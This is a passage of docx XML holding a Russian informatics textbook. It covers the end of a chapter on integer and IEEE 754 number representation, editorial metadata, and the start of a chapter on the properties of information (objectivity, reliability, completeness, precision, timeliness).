      <w:r>
        <w:t>Знаковые целые: прямой код, обратный код, дополнительный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дополнительный код как стандарт в современных ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема переполнения при операциях</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Представление вещественных чисел:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Формат с плавающей точкой IEEE 754</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Структура: знак, экспонента, мантисса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Float (32 бита) и Double (64 бита)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нормализованная форма</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Специальные значения: ±0, ±∞, NaN, денормализованные числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Проблемы точности:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Конечная точность представления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки округления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Накопление ошибок при многократных операциях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правильные методы сравнения вещественных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Практические аспекты:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Типы данных в языках программирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбор подходящего типа для задачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение в архитектуре ЭВМ, программировании, криптографии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы должны уметь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Представлять целые числа в дополнительном коде и декодировать их</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать структуру чисел с плавающей точкой IEEE 754</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объяснять причины ошибок точности при работе с вещественными числами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбирать подходящие типы данных для различных задач программирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рассчитывать диапазоны представления для различной разрядности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти знания понадобятся в главе 1.11 при изучении систем счисления, в разделе 2 при рассмотрении архитектуры ЭВМ и работы процессора, а также в разделе 6 при программировании на языках высокого уровня.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Конец главы_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Метаинформация (не включается в финальный учебник)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объём</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ~18 500 символов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время на изучение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 50-60 минут  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Средне-высокая  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предварительные требования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Главы 1.1, 1.2  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус</w:t>
      </w:r>
      <w:r>
        <w:t>: ✅ Готова (14 января 2026)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.10: Свойства информации. Информационные процессы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В предыдущей главе (1.7) мы познакомились с понятием информации и различными подходами к её определению. Теперь настало время изучить, какими </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свойствами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> обладает информация и какие </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>процессы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с ней происходят. Эти знания критически важны для понимания того, как оценивать качество информации и как с ней работать эффективно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Свойства информации определяют её ценность для получателя и возможности её использования. Информационные процессы — это операции, которые мы производим с информацией на всех этапах её жизненного цикла: от сбора до использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.5 (Меры информации), где мы изучали количественные характеристики информации, и главой 1.7 (Предмет информатики), где рассматривали понятие информации. В дальнейшем знания из этой главы понадобятся при изучении технических и программных средств работы с информацией (разделы 2 и 3), баз данных (раздел 7) и компьютерных сетей (раздел 8).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Свойства информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информация обладает рядом </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свойств</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — характеристик, которые определяют её качество и пригодность для использования. Рассмотрим основные свойства информации подробно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Объективность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объективность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это степень независимости информации от личного мнения, эмоций, предубеждений или интересов источника и получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объективная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> отражает реальное состояние дел, факты, не искажённые субъективными оценками.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Субъективная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> зависит от точки зрения, мнения, интерпретации человека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объективная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Температура воздуха +15°C" (измерение прибором)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Скорость света в вакууме 299 792 458 м/с" (физическая константа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"В базе данных содержится 1000 записей" (подсчёт системой)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Субъективная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"На улице холодно" (для одного человека +15°C — холодно, для другого — тепло)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Этот фильм интересный" (оценочное суждение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Компания работает эффективно" (зависит от критериев оценки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важный момент</w:t>
      </w:r>
      <w:r>
        <w:t>: Абсолютно объективной информации не существует, так как любое наблюдение, измерение или описание производится человеком или созданным им прибором. Однако стремление к объективности — важный принцип научного подхода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы, снижающие объективность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Предвзятость источника информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неполнота данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ошибки измерительных приборов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эмоциональная окраска сообщения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Манипуляции и пропаганда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Достоверность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Достоверность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это свойство информации быть правильной, соответствовать действительности, не содержать ошибок и искажений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Достоверная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> точно отражает реальное положение дел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостоверная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> содержит ошибки, искажения или намеренную ложь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Достоверная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Научные факты, подтверждённые экспериментами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Официальная статистика (при условии корректного сбора данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные из надёжных источников</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостоверная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фейковые новости</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Непроверенные слухи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация из ненадёжных источников</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные, полученные с ошибками измерений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы, влияющие на достоверность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность источника**: Информация из официальных, проверенных источников более достоверна</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наличие подтверждений**: Информация из нескольких независимых источников более достоверна</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Метод получения**: Научные эксперименты, статистические исследования дают более достоверные данные, чем субъективные оценки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Актуальность**: Устаревшая информация может стать недостоверной</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Преднамеренное искажение**: Дезинформация, манипуляции снижают достоверность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с объективностью</w:t>
      </w:r>
      <w:r>
        <w:t>: Объективная информация обычно более достоверна, но не всегда. Например, можно объективно (точно) передать чьё-то ложное утверждение — информация будет объективной (точно передано то, что было сказано), но недостоверной (содержание утверждения ложно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Полнота</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полнота информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это достаточность информации для понимания ситуации и принятия решения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информация считается </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>полной</w:t>
      </w:r>
      <w:r>
        <w:t>, если её достаточно для понимания проблемы и выбора действий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Информация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>неполна</w:t>
      </w:r>
      <w:r>
        <w:t>, если для принятия решения требуются дополнительные данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Полная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рецепт блюда с указанием всех ингредиентов, их количества и последовательности действий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Техническая документация на устройство со всеми необходимыми схемами и описаниями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инструкция по сборке мебели с полным набором шагов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неполная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рецепт без указания пропорций ингредиентов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес без номера дома или квартиры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расписание поездов без указания платформ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики полноты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контекстуальность**: Полнота зависит от задачи. Для одной задачи информация может быть полной, для другой — недостаточной.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Субъективность**: Для эксперта требуется меньше информации, чем для новичка (из-за наличия знаний — тезауруса).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Избыточность**: Слишком много информации (информационная перегрузка) также может быть проблемой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Для туриста "Встреча в 15:00 у метро" — неполная информация (какое метро? какой выход?). А "Встреча в 15:00 у южного выхода станции метро Тверская" — полная.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Точность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это степень соответствия информации реальному состоянию объекта или процесса, степень детализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> содержит необходимую степень детализации, правильно отражает детали.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неточная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> содержит обобщения, округления, приблизительные значения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разная степень точности одной и той же информации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Встретимся в полдень" (низкая точность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Встретимся в 12:00" (средняя точность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Встретимся в 12:00:00" (высокая точность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Встретимся в 12:00:00.000 UTC+3" (очень высокая точность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для разных задач требуется разная точность:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для бытовых целей**: "Температура около 20°C" — достаточно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для медицинских целей**: "Температура тела 36.6°C" — нужна точность до десятых</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для научных экспериментов**: "Температура 273.15 K ± 0.01 K" — требуется высочайшая точность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы, влияющие на точность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность измерительных приборов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Метод измерения или наблюдения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Округления при вычислениях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обобщения и упрощения при передаче информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с достоверностью</w:t>
      </w:r>
      <w:r>
        <w:t>: Точная информация обычно более достоверна, но избыточная точность (когда указывается точность, превышающая точность измерения) может создать ложное впечатление достоверности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Актуальность (своевременность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Актуальность информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это соответствие информации текущему моменту времени, её способность отражать текущее состояние объекта или процесса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Актуальная информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> отражает современное, текущее положение дел, поступает в нужное время.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неактуальная (устаревшая) информация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> относится к прошлому состоянию, которое уже изменилось, или поступает слишком поздно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Актуальная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прогноз погоды на сегодня</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текущий курс валют</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация о свободных местах в гостинице на нужные даты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текущее расписание транспорта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неактуальная информация</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прогноз погоды недельной давности для принятия решения сегодня</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расписание поездов прошлого года</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Информация о вакансиях, которые уже закрыты</w:t>
      </w:r>
    </w:p>
